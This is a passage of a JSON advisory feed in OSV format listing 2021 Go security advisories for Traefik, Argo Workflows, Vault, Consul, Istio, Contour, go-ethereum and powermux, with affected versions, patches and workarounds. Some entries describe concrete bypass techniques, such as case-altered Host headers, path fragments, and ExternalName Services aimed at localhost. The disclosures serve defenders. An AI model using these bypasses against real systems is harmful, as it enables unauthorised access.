v2.4.x: https://github.com/traefik/traefik/releases/tag/v2.4.13\n\n# Workarounds\n\nNo.\n\n# For more information\n\nIf you have any questions or comments about this advisory, [open an issue](https://github.com/traefik/traefik/issues).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.4.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.7.30"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/traefik/traefik/security/advisories/GHSA-m697-4v8f-55qg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32813"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/pull/8319/commits/cbaf86a93014a969b8accf39301932c17d0d73f9"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v2.4.13"}, {"type": "PACKAGE", "url": "github.com/traefik/traefik"}], "database_specific": {"cwe_ids": ["CWE-913"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-08-04T18:54:19Z", "nvd_published_at": "2021-08-03T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-prqf-xr2j-xf65", "modified": "2021-08-23T17:05:11Z", "published": "2021-08-23T19:41:41Z", "aliases": [], "summary": "Potential privilege escalation on Kubernetes >= v1.19 when the Argo Sever is run with `--auth-mode=client`", "details": "### Impact\n\nThis is pro-active fix. No know exploits exist. \n\nImpacted:\n\n* You're running Kubernetes >= v1.19\n* You're running Argo Server\n* It is configured to with `--auth-mode=client`\n* Is not configured with `--auth-mode=server`\n* You are not running Argo Server in Kubernetes pod. E.g. on bare metal or other VM.\n* You're using client key to authenticate on the server. \n* The server has more permissions that the connecting client's account.\n\nThe client's authentication will be ignored and the server's authentication will be used. This will result in privilege escalation to that of the the server's account.\n\n### Patches\n\nhttps://github.com/argoproj/argo-workflows/pull/6506\n\n### Workarounds\n\nNone.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-workflows/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.0.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-workflows/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.1.0"}, {"fixed": "3.1.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-workflows/security/advisories/GHSA-prqf-xr2j-xf65"}], "database_specific": {"cwe_ids": ["CWE-285"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-08-23T17:05:11Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-6239-28c2-9mrm", "modified": "2022-08-04T11:22:29Z", "published": "2021-08-30T17:22:38Z", "aliases": ["CVE-2021-38554"], "summary": "Improper Removal of Sensitive Information Before Storage or Transfer in HashiCorp Vault", "details": "HashiCorp Vault and Vault Enterprise\u2019s UI erroneously cached and exposed user-viewed secrets between sessions in a single shared browser. Fixed in 1.8.0 and pending 1.7.4 / 1.6.6 releases.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.7.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-38554"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-19-vault-s-ui-cached-user-viewed-secrets-between-shared-browser-sessions/28166"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/releases/tag/v1.6.6"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/releases/tag/v1.7.4"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202207-01"}], "database_specific": {"cwe_ids": ["CWE-212"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-08-30T17:14:06Z", "nvd_published_at": "2021-08-13T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h563-xh25-x54q", "modified": "2021-08-30T23:23:11Z", "published": "2021-08-09T20:37:50Z", "aliases": ["CVE-2021-37914"], "summary": "Workflow re-write vulnerability using input parameter", "details": "### Impact\n\n* Allow end-users to set input parameters, but otherwise expect workflows to be secure.\n\n### Patches\n\nNot yet.\n\n### Workarounds\n\n* Set `EXPRESSION_TEMPLATES=false` for the workflow controller\n\n\n### References\n\n* https://github.com/argoproj/argo-workflows/issues/6441\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [example link to repo](http://example.com)\n* Email us at [example email address](mailto:example@example.com)\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-workflows/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.1.0"}, {"fixed": "3.1.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-workflows/security/advisories/GHSA-h563-xh25-x54q"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-37914"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-workflows/issues/6441"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-workflows/pull/6285"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-workflows/pull/6442"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-workflows/commit/2a2ecc916925642fd8cb1efd026588e6828f82e1"}, {"type": "PACKAGE", "url": "github.com/argoproj/argo-workflows/v3"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-08-04T18:26:07Z", "nvd_published_at": "2021-08-03T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hqxw-mm44-gc4r", "modified": "2022-08-15T20:04:30Z", "published": "2021-08-30T16:16:14Z", "aliases": ["CVE-2021-39156"], "summary": "Istio Fragments in Path May Lead to Authorization Policy Bypass", "details": "### Impact\nIstio 1.11.0, 1.10.3 and below, and 1.9.7 and below contain a remotely exploitable vulnerability where an HTTP request with `#fragment` in the path may bypass Istio\u2019s URI path based authorization policies. \n\n### Patches\n* Istio 1.11.1 and above\n* Istio 1.10.4 and above\n* Istio 1.9.8 and above\n\n### Workarounds\nA Lua filter may be written to normalize the path.  This is similar to the Path normalization presented in the [Security Best Practices](https://istio.io/latest/docs/ops/best-practices/security/#case-normalization) guide.\n\n### References\nMore details can be found in the [Istio Security Bulletin](https://istio.io/latest/news/security/istio-security-2021-008)\n\n### For more information\nIf you have any questions or comments about this advisory, please email us at istio-security-vulnerability-reports@googlegroups.com\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.8"}]}]}, {"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.4"}]}]}, {"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.1"}]}], "versions": ["1.11.0"]}], "references": [{"type": "WEB", "url": "https://github.com/istio/istio/security/advisories/GHSA-hqxw-mm44-gc4r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-39156"}, {"type": "PACKAGE", "url": "https://github.com/istio/istio"}, {"type": "WEB", "url": "https://istio.io/latest/news/security/istio-security-2021-008"}], "database_specific": {"cwe_ids": ["CWE-706", "CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-08-25T22:28:17Z", "nvd_published_at": "2021-08-24T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5ph6-qq5x-7jwc", "modified": "2021-08-30T16:53:38Z", "published": "2021-08-30T17:22:10Z", "aliases": ["CVE-2021-32783"], "summary": "ExternalName Services can be used to gain access to Envoy's admin interface", "details": "### Impact\nJosh Ferrell (@josh-ferrell) from VMware has reported that a specially crafted ExternalName type Service may be used to access Envoy's admin interface, which Contour normally prevents from access outside the Envoy container. This can be used to shut down Envoy remotely (a denial of service), or to expose the existence of any Secret that Envoy is using for its configuration, including most notably TLS Keypairs. However, it *cannot* be used to get the *content* of those secrets.\n\nSince this attack allows access to the administration interface, a variety of administration options are available, such as shutting down the Envoy or draining traffic. In general, the Envoy admin interface cannot easily be used for making changes to the cluster, in-flight requests, or backend services, but it could be used to shut down or drain Envoy, change traffic routing, or to retrieve secret metadata, as mentioned above.\n\n### Patches\nThe issue will be addressed in the forthcoming Contour v1.18.0 and a patch release, v1.17.1, has been released in the meantime.\n\nIt is addressed in two ways:\n- disabling ExternalName type Services by default\n- When ExternalName Services are enabled, block obvious \"localhost\" entries.\n\n#### Disable ExternalName type Services by default\n\nThis change prohibits processing of ExternalName services unless the cluster operator specifically allows them using the new `--enable-externalname` flag or equivalent configuration file setting. This is a breaking change for previous versions of Contour, which is unfortunate, but necessary because of the severity of the information exposed in this advisory.\n\n\n#### Block obvious `localhost` entries for enabled ExternalName Services\n\nAs part of this change set, we have added a filter in the event that operators *do* enable ExternalName Services, such that obvious `localhost` entries are rejected by Contour.\n\nThere are a number of problems with this method, however:\n- This is a porous control. As long as you control a domain name, it's trivially easy to add a DNS entry for any name you like that redirects to `127.0.0.1` or `::1`. Contour even provides `local.projectcontour.io` ourselves for testing and example purposes. (This name is, of course, included in the \"obvious localhost entries\" list.) So we can never totally stop this exploit as long as the admin interface is accessible on localhost, which, according to envoyproxy/envoy#2763, will be for some time if not forever. The best we can do is block some obvious elements, but this is always a risk for a motivated attacker.\n- We've actually suggested using `localhost` ExternalName Services in the past, to allow people to connect to sidecar External Authentication services in their cluster. Both of these changes break this use-case, but given that it's about something that has security requirements high enough to require authentication, it's important to ensure that people are opting in. For the External Auth sidecar case, we are investigating an update to ExtensionService that will help with the sidecar use case.\n\n### Workarounds\nNot easily. It's not possible to control the creation of ExternalName Services with RBAC without the use of Gatekeeper or other form of admission control, and the creation of services is required for Contour to actually work for application developer personas.\n\n### For more information\nExploit code will be published at a later date for this vulnerability, once our users have had a chance to upgrade.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/projectcontour/contour"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.14.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/projectcontour/contour"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.15.0"}, {"fixed": "1.15.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/projectcontour/contour"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.16.0"}, {"fixed": "1.16.1"}]}], "versions": ["1.16.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/projectcontour/contour"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.17.0"}, {"fixed": "1.17.1"}]}], "versions": ["1.17.0"]}], "references": [{"type": "WEB", "url": "https://github.com/projectcontour/contour/security/advisories/GHSA-5ph6-qq5x-7jwc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32783"}, {"type": "WEB", "url": "https://github.com/projectcontour/contour/commit/5f3e6d0ab1d48e64bae46400c85c490b200393a3"}, {"type": "WEB", "url": "https://github.com/projectcontour/contour/commit/b53a5c4fd927f4ea2c6cf02f1359d8e28bef852e"}, {"type": "WEB", "url": "https://github.com/projectcontour/contour/releases/tag/v1.14.2"}, {"type": "WEB", "url": "https://github.com/projectcontour/contour/releases/tag/v1.15.2"}, {"type": "WEB", "url": "https://github.com/projectcontour/contour/releases/tag/v1.16.1"}, {"type": "WEB", "url": "https://github.com/projectcontour/contour/releases/tag/v1.17.1"}], "database_specific": {"cwe_ids": ["CWE-610"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-08-30T16:53:38Z", "nvd_published_at": "2021-07-23T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fp52-qw33-mfmw", "modified": "2023-08-29T22:39:27Z", "published": "2021-08-02T17:11:41Z", "aliases": ["CVE-2020-16250"], "summary": "Authentication Bypass by Spoofing and Insufficient Verification of Data Authenticity in Hashicorp Vault", "details": "HashiCorp Vault and Vault Enterprise versions 0.7.1 and newer, when configured with the AWS IAM auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1..", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.8.1"}, {"fixed": "1.2.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.3.0"}, {"fixed": "1.3.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.0"}, {"fixed": "1.4.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.5.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-16250"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/vault/"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/159478/Hashicorp-Vault-AWS-IAM-Integration-Authentication-Bypass.html"}], "database_specific": {"cwe_ids": ["CWE-290", "CWE-345"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-07-26T18:55:09Z", "nvd_published_at": "2020-08-26T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6c73-2v8x-qpvm", "modified": "2021-08-23T17:02:24Z", "published": "2021-08-23T19:41:30Z", "aliases": [], "summary": "Argo Server TLS requests could be forged by attacker with network access", "details": "### Impact\n\nWe are not aware of any exploits. This is a pro-active fix.\n\nImpacted: \n\n* You are running Argo Server < v3.0 with `--secure=true` or >= v3.0 with `--secure` unspecified (note - running in secure mode is recommended regardless).\n* The attacker is within your network. If you expose Argo Server to the Internet then \"your network\" is \"the Internet\". \n\nThe Argo Server's keys are packaged within the image. They could be extracted and used to decrypt traffic, or forge requests.\n\n### Patches\n\nhttps://github.com/argoproj/argo-workflows/pull/6540\n\n### Workarounds\n\n* Make sure that your Argo Server service or pod are not directly accessible outside of your cluster. Put TLS load balancer in front of it.\n\nThis was identified by engineers at Jetstack.io", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-workflows/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.0.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-workflows/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.1.0"}, {"fixed": "3.1.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-workflows/security/advisories/GHSA-6c73-2v8x-qpvm"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-08-23T17:02:24Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-rc7p-gmvh-xfx2", "modified": "2021-08-02T17:18:32Z", "published": "2021-08-02T17:19:52Z", "aliases": [], "summary": "Attack on Kubernetes via Misconfigured Argo Workflows", "details": "### Impact\n\nUsers running using the Argo Server with `--auth-mode=server` (which is the default < v3.0.0) AND have exposed their UI to the Internet may allow remote users to execute arbitrary code on their cluster, e.g. crypto-mining.\n\n### Resolution\n\n* Do not expose your user interface to the Internet. \n* Change configuration. `--auth-mode=client`. \n\nFor users using an older 2.x version of Argo Server, consider upgrading to Argo Server version 3.x or later.\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-workflows"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}], "database_specific": {"last_known_affected_version_range": "< 3.0.0"}}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-workflows/security/advisories/GHSA-rc7p-gmvh-xfx2"}, {"type": "WEB", "url": "https://www.intezer.com/blog/container-security/new-attacks-on-kubernetes-via-misconfigured-argo-workflows/"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-07-22T20:25:42Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-23fq-q7hc-993r", "modified": "2022-08-11T21:57:44Z", "published": "2021-08-30T17:22:53Z", "aliases": ["CVE-2021-38553"], "summary": "HashiCorp Vault underlying database had excessively broad filesystem permissions from v1.4.0 until v1.8.0", "details": "HashiCorp Vault and Vault Enterprise 1.4.0 through 1.7.3 initialized an underlying database file associated with the Integrated Storage feature with excessively broad filesystem permissions. Fixed in Vault and Vault Enterprise 1.8.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.0"}, {"fixed": "1.8.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-38553"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-20-vault-s-integrated-storage-backend-database-file-may-have-excessively-broad-permissions/28168"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault/"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202207-01"}], "database_specific": {"cwe_ids": ["CWE-281"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-08-30T17:16:42Z", "nvd_published_at": "2021-08-13T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7774-7vr3-cc8j", "modified": "2021-12-13T13:09:54Z", "published": "2021-08-30T16:15:56Z", "aliases": ["CVE-2021-39155"], "summary": "Authorization Policy Bypass Due to Case Insensitive Host Comparison", "details": "### Impact\nAccording to [RFC 4343](https://datatracker.ietf.org/doc/html/rfc4343), Istio authorization policy should compare the hostname in the HTTP Host header in a case insensitive way, but currently the comparison is case sensitive.  The Envoy proxy will route the request hostname in a case-insensitive way which means the authorization policy could be bypassed.\n \nAs an example, the user may have an authorization policy that rejects request with hostname \"httpbin.foo\" for some source IPs, but the attacker can bypass this by sending the request with hostname \"Httpbin.Foo\".\n\n### Patches\n* Istio 1.11.1 and above\n* Istio 1.10.4 and above\n* Istio 1.9.8 and above\n\n### Workarounds\nA Lua filter may be written to normalize Host header before the authorization check.  This is similar to the Path normalization presented in the [Security Best Practices](https://istio.io/latest/docs/ops/best-practices/security/#case-normalization) guide.\n\n### References\nMore details can be found in the [Istio Security Bulletin](https://istio.io/latest/news/security/istio-security-2021-008).\n\n### For more information\nIf you have any questions or comments about this advisory, please email us at istio-security-vulnerability-reports@googlegroups.com\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.8"}]}]}, {"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.4"}]}]}, {"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.1"}]}], "versions": ["1.11.0"]}], "references": [{"type": "WEB", "url": "https://github.com/istio/istio/security/advisories/GHSA-7774-7vr3-cc8j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-39155"}, {"type": "WEB", "url": "https://github.com/istio/istio/commit/084b417a486dbe9b9024d4812877016a484572b1"}, {"type": "WEB", "url": "https://github.com/istio/istio/commit/76ed51413ddd2a7fa253a368ab20a9cec5fb1cbe"}, {"type": "WEB", "url": "https://github.com/istio/istio/commit/90b00bdf891e6c770cb3235c14a9b1fda96cc7c5"}, {"type": "WEB", "url": "https://datatracker.ietf.org/doc/html/rfc4343"}, {"type": "PACKAGE", "url": "https://github.com/istio/istio"}], "database_specific": {"cwe_ids": ["CWE-178"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-08-25T22:29:16Z", "nvd_published_at": "2021-08-24T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9856-9gg9-qcmq", "modified": "2023-08-29T18:53:25Z", "published": "2021-08-30T16:15:41Z", "aliases": ["CVE-2021-39137"], "summary": "Ethereum Contains Consensus Flaw During Block Processing", "details": "### Impact\n\nA vulnerability in the Geth EVM could cause a node to reject the canonical chain. \n\n### Description \n\nA memory-corruption bug within the EVM can cause a consensus error, where vulnerable nodes obtain a different `stateRoot` when processing a maliciously crafted transaction. This, in turn, would lead to the chain being split in two forks.\n\nAll Geth versions supporting the London hard fork are vulnerable (which predates London), so all users should update.\n\nThis bug was exploited on Mainnet at block 13107518, leading to a minority chain split. \n\n### Patches\n\nA patch is included in the `v1.10.8` release.\nThe exact patch to fix the issue is contained within this [commit](https://github.com/ethereum/go-ethereum/pull/23381/commits/4d4879cafd1b3c906fc184a8c4a357137465128f)\n\n### Workarounds\n\nNo workarounds exist, save to update and/or apply the patch commit. \n\n### References. \n\nPost-mortem [write-up](https://github.com/ethereum/go-ethereum/blob/master/docs/postmortems/2021-08-22-split-postmortem.md).\n\n### Credits\n\nThe bug was found by @guidovranken (working for [Sentnl](https://sentnl.io/) during an audit of the [Telos EVM](https://www.telos.net/evm)) and reported via bounty@ethereum.org.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum/)\n* Email us at [security@ethereum.org](mailto:security@ethereum.org)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.8"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/security/advisories/GHSA-9856-9gg9-qcmq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-39137"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/pull/23381/commits/4d4879cafd1b3c906fc184a8c4a357137465128f"}, {"type": "PACKAGE", "url": "https://github.com/ethereum/go-ethereum"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/releases/tag/v1.10.8"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0254"}], "database_specific": {"cwe_ids": ["CWE-436"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-08-26T15:08:22Z", "nvd_published_at": "2021-08-24T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8h2g-r292-j8xh", "modified": "2022-08-11T20:43:23Z", "published": "2021-07-19T21:21:12Z", "aliases": ["CVE-2021-36213"], "summary": "HashiCorp Consul L7 deny intention results in an allow action", "details": "In HashiCorp Consul before 1.10.1 (and Consul Enterprise), xds can generate a situation where a single L7 deny intention (with a default deny policy) results in an allow action.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.10.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-36213"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-16-consul-s-application-aware-intentions-deny-action-fails-open-when-combined-with-default-deny-policy/26855"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul/"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/releases/tag/v1.10.1"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202208-09"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/consul"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-07-19T17:33:14Z", "nvd_published_at": "2021-07-17T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9vh5-r4qw-v3vv", "modified": "2021-07-27T15:15:57Z", "published": "2021-07-28T17:57:46Z", "aliases": ["CVE-2020-7220"], "summary": "Improper Resource Shutdown or Release in HashiCorp Vault", "details": "HashiCorp Vault Enterprise 0.11.0 through 1.3.1 fails, in certain circumstances, to revoke dynamic secrets for a mount in a deleted namespace. Fixed in 1.3.2.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.11.0"}, {"fixed": "1.3.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7220"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#132-january-22nd-2020"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/vault/"}], "database_specific": {"cwe_ids": ["CWE-404"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-07-27T15:15:57Z", "nvd_published_at": "2020-01-23T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r9w6-rhh9-7v53", "modified": "2021-07-27T15:08:01Z", "published": "2021-07-28T17:57:57Z", "aliases": ["CVE-2020-7955"], "summary": "Incorrect Authorization in HashiCorp Consul", "details": "HashiCorp Consul and Consul Enterprise 1.4.1 through 1.6.2 did not uniformly enforce ACLs across all API endpoints, resulting in potential unintended information disclosure. Fixed in 1.6.3.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.1"}, {"fixed": "1.6.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.6.2"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7955"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/issues/7160"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/consul/"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-07-27T15:08:01Z", "nvd_published_at": "2020-01-31T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mj9r-wwm8-7q52", "modified": "2021-06-30T17:43:53Z", "published": "2021-07-01T17:00:32Z", "aliases": ["CVE-2021-32721"], "summary": "Open Redirect in github.com/AndrewBurian/powermux", "details": "### Impact\nAttackers may be able to craft phishing links and other open redirects by exploiting the trailing slash redirection feature. This may lead to users being redirected to untrusted sites after following an attacker crafted link.\n\n### Patches\nThe issue is resolved in v1.1.1\n\n### Workarounds\nThere are no existing workarounds.\nYou may detect attempts to craft urls that exploit this feature by looking for request paths containing pairs of forward slashes in sequence combined with a trailing slash e.g. `https://example.com//foo/`\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/AndrewBurian/powermux"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/AndrewBurian/powermux/security/advisories/GHSA-mj9r-wwm8-7q52"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32721"}, {"type": "WEB", "url": "https://github.com/AndrewBurian/powermux/commit/5e60a8a0372b35a898796c2697c40e8daabed8e9"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-06-30T17:43:53Z", "nvd_published_at": 